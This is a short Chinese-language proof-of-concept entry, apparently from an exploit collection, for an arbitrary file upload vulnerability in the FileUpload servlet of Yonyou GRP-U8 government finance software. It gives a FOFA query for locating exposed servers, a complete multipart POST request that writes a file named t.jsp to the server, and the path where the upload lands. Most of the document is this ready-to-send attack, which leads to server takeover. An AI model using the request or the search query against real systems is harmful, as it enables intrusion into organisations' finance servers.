## 用友GRP-U8-FileUpload任意文件上传

用友GRP-U8行政事业财务管理软件是用友公司专注于电子政务事业，基于云计算技术所推出的新一代产品，是我国行政事业财务领域专业的财务管理软件。用友 GRP-U8 FileUpload接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。

## fofa

```yaml
app="用友-GRP-U8"
```

## poc

```yaml
POST /servlet/FileUpload?fileName=t.jsp&actionID=update HTTP/1.1
Host: 
Content-Length: 187
Cache-Control: max-age=0
Origin: null
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryA8Ee42FOAqdLah9L
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryA8Ee42FOAqdLah9L
Content-Disposition: form-data; name="rfile_name"; filename="2.png"
Content-Type: image/png

111
------WebKitFormBoundaryA8Ee42FOAqdLah9L--
```

上传路径为`/R9iPortal/upload/t.jsp`
